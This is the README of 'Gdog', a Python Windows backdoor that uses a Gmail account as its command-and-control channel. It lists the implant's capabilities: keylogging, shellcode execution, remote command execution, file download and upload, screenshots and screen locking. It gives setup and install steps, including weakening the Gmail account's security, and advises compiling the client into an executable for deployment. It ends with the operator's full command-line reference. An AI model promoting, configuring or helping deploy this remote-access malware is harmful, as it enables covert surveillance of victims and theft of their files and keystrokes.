Gdog
====
A stealthy Python based Windows backdoor that uses Gmail as a command and control server

This project was inspired by the gcat(https://github.com/byt3bl33d3r/gcat) from byt3bl33d3r.


Requirements
=====
* Python 2.x
* PyCrypto module
* WMI module
* Enum34 module
* Netifaces module


Features
=====
* Encrypted transportation messages (AES) + SHA256 hashing
* Generate computer unique id using system information/characteristics (SHA256 hash)
* Job IDs are random SHA256 hashes
* Retrieve system information
* Retrieve Geolocation information (City, Country, lat, long, etc..)
* Retrieve running processes/system services/system users/devices (hardware)
* Retrieve list of clients
* Execute system command
* Download files from client 
* Upload files to client
* Execute shellcode
* Take screenshot
* Lock client's screen 
* Keylogger
* Lock remote computer's screen
* Shutdown/Restart remote computer
* Log off current user
* Download file from the WEB
* Visit website
* Show message box to user


Setup
=====
For this to work you need:
- A Gmail account (**Use a dedicated account! Do not use your personal one!**)
- Turn on "Allow less secure apps" under the security settings of the account.
- You may also have to enable IMAP in the account settings.


Download/Installation
====
* https://sourceforge.net/projects/pywin32
* git clone https://github.com/maldevel/gdog
* pip install -r requirements.txt --user


Contents
=====
- ```gdog.py``` a script that's used to enumerate and issue commands to available clients
- ```client.py``` the actual backdoor to deploy

You're probably going to want to compile ```client.py``` into an executable using [Pyinstaller](https://github.com/pyinstaller/pyinstaller)

**Note: It's recommended you compile client.py using a 32bit Python installation**


Usage
=====
```
                      __
           ____ _____/ /___  ____ _
          / __ `/ __  / __ \/ __ `/
         / /_/ / /_/ / /_/ / /_/ /
         \__, /\__,_/\____/\__, /
        /____/            /____/

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -id ID                Client to target
  -jobid JOBID          Job id to retrieve

  -list                 List available clients
  -info                 Retrieve info on specified client

Commands:
  Commands to execute on an implant

  -cmd CMD              Execute a system command
  -visitwebsite URL     Visit website
  -message TEXT TITLE   Show message to user
  -tasks                Retrieve running processes
  -services             Retrieve system services
  -users                Retrieve system users
  -devices              Retrieve devices(Hardware)
  -download PATH        Download a file from a clients system
  -download-fromurl URL
                        Download a file from the web
  -upload SRC DST       Upload a file to the clients system
  -exec-shellcode FILE  Execute supplied shellcode on a client
  -screenshot           Take a screenshot
  -lock-screen          Lock the clients screen
  -shutdown             Shutdown remote computer
  -restart              Restart remote computer
  -logoff               Log off current remote user
  -force-checkin        Force a check in
  -start-keylogger      Start keylogger
  -stop-keylogger       Stop keylogger
```
